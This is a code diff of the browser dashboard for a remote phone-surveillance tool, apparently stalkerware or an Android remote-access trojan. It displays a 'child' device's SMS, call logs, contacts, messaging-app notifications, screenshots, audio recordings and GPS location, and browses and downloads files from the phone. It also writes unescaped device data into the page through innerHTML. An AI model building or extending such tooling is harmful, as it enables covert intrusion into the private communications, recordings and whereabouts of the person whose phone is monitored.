-            const body = document.getElementById('sms-list'); body.innerHTML = '';
-            data.sms.forEach(s => { body.innerHTML += `<tr><td><span class="fw-bold">${s.address}</span></td><td>${s.body}</td><td class="text-muted small">${new Date(s.date).toLocaleString()}</td></tr>`; });
+        socket.on('child_screenshot', () => {
+            const url = '/captured_screenshot.jpg?t=' + Date.now();
+            document.getElementById('screenshot-img').src = url;
+            document.getElementById('screenshot-download').href = url;
+            document.getElementById('screenshot-modal').classList.remove('d-none');
+            log("System: Screenshot received.");
         });
 
-        socket.on('child_call_logs', (data) => {
-            const body = document.getElementById('calls-list'); body.innerHTML = '';
-            data.calls.forEach(c => { body.innerHTML += `<tr><td>${c.number}</td><td><span class="badge ${c.type==1?'bg-success':'bg-primary'}">${c.type==1?'IN':'OUT'}</span></td><td>${c.duration}s</td></tr>`; });
+        socket.on('audio_ready', d => {
+            document.getElementById('audio-player').src = d.url;
+            document.getElementById('audio-download').href = d.url;
+            document.getElementById('audio-modal').classList.remove('d-none');
+            log("Audio: New recording ready.");
         });
 
-        socket.on('child_contacts', (data) => {
-            const body = document.getElementById('contacts-list'); body.innerHTML = '';
-            data.contacts.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c => { body.innerHTML += `<tr><td>${c.name}</td><td>${c.number}</td></tr>`; });
-        });
-
-        socket.on('child_notification', (data) => {
+        socket.on('child_notification', d => {
             const body = document.getElementById('notif-list');
-            let appIcon = 'fa-bell';
-            let color = 'bg-secondary';
-
-            const pkg = data.app.toLowerCase();
-            if(pkg.includes('whatsapp')) { appIcon = 'fa-whatsapp text-success'; color = 'bg-success'; }
-            else if(pkg.includes('facebook') || pkg.includes('messenger')) { appIcon = 'fa-facebook text-primary'; color = 'bg-primary'; }
-            else if(pkg.includes('instagram')) { appIcon = 'fa-instagram text-danger'; color = 'bg-danger'; }
-            else if(pkg.includes('sms') || pkg.includes('message')) { appIcon = 'fa-comment-dots text-info'; color = 'bg-info'; }
-
-            const row = `<tr class="align-middle">
-                <td>
-                    <div class="d-flex align-items-center">
-                        <i class="fab ${appIcon} me-2 fa-lg"></i>
-                        <span class="badge ${color} rounded-pill">${data.app}</span>
-                    </div>
-                </td>
-                <td class="fw-bold text-dark">${data.title}</td>
-                <td style="max-width: 400px; overflow: hidden; text-overflow: ellipsis;">
-                    <div class="p-2 bg-light rounded" style="border-left: 4px solid var(--primary)">
-                        ${data.text}
-                    </div>
-                </td>
+            const row = `<tr>
+                <td><span class="badge bg-primary px-3 rounded-pill">${d.app}</span></td>
+                <td class="fw-bold">${d.title}</td>
+                <td><div class="p-2 bg-light rounded">${d.text}</div></td>
                 <td class="text-muted small">${new Date().toLocaleTimeString()}</td>
             </tr>`;
             body.insertAdjacentHTML('afterbegin', row);
-            log(`Notification: [${data.app}] ${data.title}`);
         });
 
-        socket.on('child_screenshot_taken', (data) => {
-            const modal = document.getElementById('screenshot-modal');
-            const img = document.getElementById('screenshot-img');
-            const download = document.getElementById('screenshot-download');
-            const url = '/captured_screenshot.jpg?t=' + Date.now();
-
-            img.src = url;
-            download.href = url;
-            download.setAttribute('download', `screenshot_${Date.now()}.jpg`);
-            modal.classList.remove('d-none');
-            log("System: New screenshot capture ready!");
+        socket.on('child_location_update', d => {
+            log(`Location: Received GPS [${d.lat}, ${d.lng}]`);
+            window.open(`https://www.google.com/maps?q=${d.lat},${d.lng}`, '_blank');
         });
 
-        socket.on('audio_ready', (data) => {
-            const modal = document.getElementById('audio-modal');
-            const player = document.getElementById('audio-player');
-            const download = document.getElementById('audio-download');
-            player.src = data.url;
-            download.href = data.url;
-            download.setAttribute('download', data.name);
-            modal.classList.remove('d-none');
-            log("System: New audio recording received!");
+        socket.on('child_sms_list', d => {
+            const b = document.getElementById('sms-list'); b.innerHTML = '';
+            d.sms.forEach(s => b.innerHTML += `<tr><td><span class="fw-bold">${s.address}</span></td><td>${s.body}</td><td class="text-muted small">${new Date(s.date).toLocaleString()}</td></tr>`);
         });
 
-        socket.on('child_location_update', (data) => {
-            log(`Location: Got GPS [${data.lat}, ${data.lng}]`);
-            window.open(`https://www.google.com/maps?q=${data.lat},${data.lng}`, '_blank');
+        socket.on('child_call_logs', d => {
+            const b = document.getElementById('calls-list'); b.innerHTML = '';
+            d.calls.forEach(c => b.innerHTML += `<tr><td>${c.number}</td><td><span class="badge bg-secondary">${c.type==1?'Incoming':'Outgoing'}</span></td><td>${c.duration}s</td><td class="text-muted small">${new Date(c.date).toLocaleString()}</td></tr>`);
         });
 
-        socket.on('file_list', (data) => {
-            const grid = document.getElementById('file-grid');
-            grid.innerHTML = '';
-            currentPath = data.path;
-            document.getElementById('path-input').value = currentPath;
+        socket.on('child_contacts', d => {
+            const b = document.getElementById('contacts-list'); b.innerHTML = '';
+            d.contacts.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c => b.innerHTML += `<tr><td class="fw-medium">${c.name}</td><td>${c.number}</td></tr>`);
+        });
 
-            updateBreadcrumbs(currentPath);
-
-            data.files.sort((a,b)=>b.is_directory - a.is_directory).forEach(file => {
-                const card = document.createElement('div');
-                card.className = 'file-card';
-
-                let iconClass = 'fa-file-alt';
-                let colorClass = 'text-secondary';
-
-                if(file.is_directory) { iconClass = 'fa-folder'; colorClass = 'text-warning'; }
-                else if(file.name.match(/\.(jpg|jpeg|png|webp)$/i)) { iconClass = 'fa-image'; colorClass = 'text-info'; }
-                else if(file.name.match(/\.(mp4|mkv|3gp)$/i)) { iconClass = 'fa-video'; colorClass = 'text-danger'; }
-                else if(file.name.match(/\.(mp3|wav|ogg)$/i)) { iconClass = 'fa-music'; colorClass = 'text-success'; }
-
-                let thumbHtml = `<i class="fas ${iconClass} ${colorClass}"></i>`;
-                if(file.thumbnail) {
-                    thumbHtml = `<img src="data:image/jpeg;base64,${file.thumbnail}" alt="thumb">`;
-                }
-
-                card.innerHTML = `
-                    <div class="file-thumb-container">${thumbHtml}</div>
-                    <div class="file-name" title="${file.name}">${file.name}</div>
-                    <div class="file-meta">${file.is_directory ? 'Folder' : file.formatted_size}</div>
-                    <div class="file-meta">${file.last_modified}</div>
-                `;
-
-                card.onclick = () => {
-                    if(file.is_directory) browseFolder(file.path);
-                    else if(confirm(`Download ${file.name}?`)) sendCommand('get_file', {file_path: file.path});
-                };
+        socket.on('file_list', d => {
+            const grid = document.getElementById('file-grid'); grid.innerHTML = '';
+            currentPath = d.path; document.getElementById('path-input').value = currentPath; updateBreadcrumbs(d.path);
+            d.files.sort((a,b)=>b.is_directory - a.is_directory).forEach(f => {
+                const card = document.createElement('div'); card.className = 'file-card';
+                let icon = f.is_directory ? 'fa-folder text-warning' : 'fa-file-alt text-secondary';
+                if(f.thumbnail) thumbHtml = `<img src="data:image/jpeg;base64,${f.thumbnail}" alt="T">`;
+                else thumbHtml = `<i class="fas ${icon}"></i>`;
+                card.innerHTML = `<div class="file-thumb">${thumbHtml}</div><div class="file-name">${f.name}</div><div class="small text-muted">${f.is_directory ? 'Folder' : f.formatted_size}</div>`;
+                card.onclick = () => { if(f.is_directory) browseFolder(f.path); else if(confirm('Download?')) sendCommand('get_file', {file_path: f.path}); };
                 grid.appendChild(card);
             });
         });
 
-        function updateBreadcrumbs(path) {
-            const bc = document.getElementById('file-breadcrumbs');
-            bc.innerHTML = '';
-            const parts = path.split('/').filter(p => p);
-
-            let fullPath = '';
-
-            // Add Root
-            const rootItem = document.createElement('li');
-            rootItem.className = 'breadcrumb-item';
-            rootItem.innerText = 'Root';
-            rootItem.onclick = () => browseFolder('/');
-            bc.appendChild(rootItem);
-
-            parts.forEach((part, index) => {
-                fullPath += '/' + part;
-                const li = document.createElement('li');
-                li.className = 'breadcrumb-item' + (index === parts.length - 1 ? ' active' : '');
-                li.innerText = part;
-                if(index < parts.length - 1) {
-                    const thisPath = fullPath;
-                    li.onclick = () => browseFolder(thisPath);
-                }
+        function updateBreadcrumbs(p) {
+            const bc = document.getElementById('file-breadcrumbs'); bc.innerHTML = '';
+            const parts = p.split('/').filter(x=>x);
+            let full = ''; parts.forEach((part, i) => {
+                full += '/' + part; const li = document.createElement('li');
+                li.className = `breadcrumb-item ${i===parts.length-1?'active':''}`;
+                li.innerText = part; if(i < parts.length-1) { const cp = full; li.onclick = () => browseFolder(cp); }
                 bc.appendChild(li);
             });
         }
 
-        socket.on('download_ready', (data) => { alert(`File "${data.name}" downloaded to server!`); });
-
-        function sendCommand(action, params = {}) {
-            socket.emit('gui_command', { action: action, ...params });
-            log("ACTION: Sent command [" + action.toUpperCase() + "]");
-        }
-
-        function browseFolder(path) { sendCommand('list_files', {path: path}); }
+        function sendCommand(a, p = {}) { socket.emit('gui_command', { action: a, ...p }); log(`CMD: Sent [${a.toUpperCase()}]`); }
+        function browseFolder(p) { sendCommand('list_files', {path: p}); }
         function loadFiles() { browseFolder(document.getElementById('path-input').value); }
         function goBack() { browseFolder(currentPath.substring(0, currentPath.lastIndexOf('/')) || "/sdcard/"); }
-        function closeImg() { document.getElementById('image-modal').classList.add('d-none'); }
-
         function showTab(id) {
-            document.querySelectorAll('.tab-pane').forEach(el => el.classList.add('d-none'));
+            document.querySelectorAll('.tab-pane').forEach(e => e.classList.add('d-none'));
             document.getElementById(id).classList.remove('d-none');
-            document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.nav-link').forEach(e => e.classList.remove('active'));
             event.currentTarget.classList.add('active');
         }
-
-        function log(msg) {
-            const container = document.getElementById('log-container');
-            container.innerHTML += `<div><span class="text-white-50">[${new Date().toLocaleTimeString()}]</span> ${msg}</div>`;
-            container.scrollTop = container.scrollHeight;
+        function log(m) {
+            const c = document.getElementById('log-container');
+            c.innerHTML += `<div><span class="text-white-50">[${new Date().toLocaleTimeString()}]</span> ${m}</div>`;
+            c.scrollTop = c.scrollHeight;
         }
     </script>
 </body>
